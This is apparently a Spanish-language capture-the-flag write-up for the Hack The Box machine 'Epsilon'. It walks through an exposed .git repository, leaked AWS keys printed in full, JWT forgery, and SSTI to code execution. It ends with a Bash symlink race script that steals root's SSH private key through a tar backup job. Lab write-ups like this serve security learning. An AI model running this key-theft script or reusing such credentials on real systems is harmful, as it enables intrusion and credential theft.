---
layout: single
title: Epsilon - Hack The Box
excerpt: "Epsilon es una máquina de hackthebox de dificultad media, en lo cual contiene un .git expuesto en el servidor, en lo cual contempla el codigo fuente del servicio web y del aws. Luego, mediante las modificaciones que se han hecho, logramos extraer el  aws_access_key_id y aws_secret_access_key que nos sirve para conectarnos al aws lambda."
date: 2022-09-24
classes: wide
header:
  
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - cxdxnt
tags:  
  - git-dumper
  - aws enumeration
  - abusing jwt
  - ssti
  - tar symlink exploitation
---

## Enumeración
Lanzamos un escaneo de nmap.Y encontramos que hay un .git expuesto en la web que contiene el codigo fuente de la web, y algunos datos del aws.
```bash
nmap -sCV -p22,80,5000 10.10.11.134 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 10:33 -03
Nmap scan report for 10.10.11.134
Host is up (0.24s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   10.10.11.134:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
|_http-title: Costume Shop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.34 seconds
```

Sabiendo que hay un .git en el servidor web, con git-dumper sacamos su contenido. Luego mediante commit vemos los datos que necesitamos para conectarnos al aws.

![](/assets/images/htb-writeup-epsilon/aws_pass.png)

Como ya tenemos los datos necesarios para conectarnos al aws, hacemos un aws configure y agregamos los siguientes datos.

```bash
aws configure
AWS Access Key ID [****************6TDC]: AQLA5M37BDN6FJP76TDC 
AWS Secret Access Key [****************Fo1A]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A  
Default region name [us-east-1]: us-east-1
Default output format [json]: json
```

Ahora nos conectamos.

![](/assets/images/htb-writeup-epsilon/datos_aws.png)

Ahora procedemos a extraer el archivo de dicha funcion.

![](/assets/images/htb-writeup-epsilon/archivo.png)

Nos descargamos el archivo y vemos que es un .zip, entonces lo descomprimimos y obtenemos el secret para el token.

![](/assets/images/htb-writeup-epsilon/secret-key.png)

Ahora nos creamos un token para entrar como admin en la web.

![](/assets/images/htb-writeup-epsilon/json.png)

Una vez adentro nos dirigimos a http://10.10.11.134:5000/order, y vemos que se nos refleja glasses, entonces hacemos una prueba para ver si es vulnerable a ssti.Interceptamos la solicitud y cambiamos el campo costume.
![](/assets/images/htb-writeup-epsilon/testing-2.png)

Es vulnerable.

![](/assets/images/htb-writeup-epsilon/suma.png)

Ahora lo que procede es ver si podemos ejecutar comandos.Probamos una inyeccion ssti y funciona.

![](/assets/images/htb-writeup-epsilon/rce.png)

## Elevación de Privilegios

Una vez dentro del sistema procedemos a descargarnos la herramienta pspy que nos sirve para monitorizar procesos y extraemos la siguiente información.

![](/assets/images/htb-writeup-epsilon/pspy.png)

Si nos vamos a explainshell vemos que nos indica que esta haciendo tar.

![](/assets/images/htb-writeup-epsilon/tar-comandos.png)

Ahora imprimimos el archivo backup.sh

```bash
#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/* # Borra todos los archivos de /opt/backups
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/ # Crea un archivo tar del contenido que hay en /var/www/app
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum #Crea /opt/backups/checksum que contiene el hash SHA1 del nuevo archivo.
sleep 5 # duerme 5 segundos
check_file=`date +%N` 
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar" #Crea un nuevo archivo tar que contenga el primer archivo y el archivo de suma
/usr/bin/rm -rf /opt/backups/* #Elimina todo lo que haya en /opt/backups/
```
Para aprovechar esto, usaré un bucle Bash para buscar el checksum  y lo reemplazaré con un enlace simbólico al id_rsa de root.

```bash
#!/bin/bash
file=/opt/backups/checksum
while :
do

if [ -e "$file" ]; then
    echo -e "[!]pwned\n"
    rm -rf $file
    ln -s -f /root/.ssh/id_rsa /opt/backups/checksum
    exit
fi
done
```


Conseguido :D.

![](/assets/images/htb-writeup-epsilon/id-rsa.png)
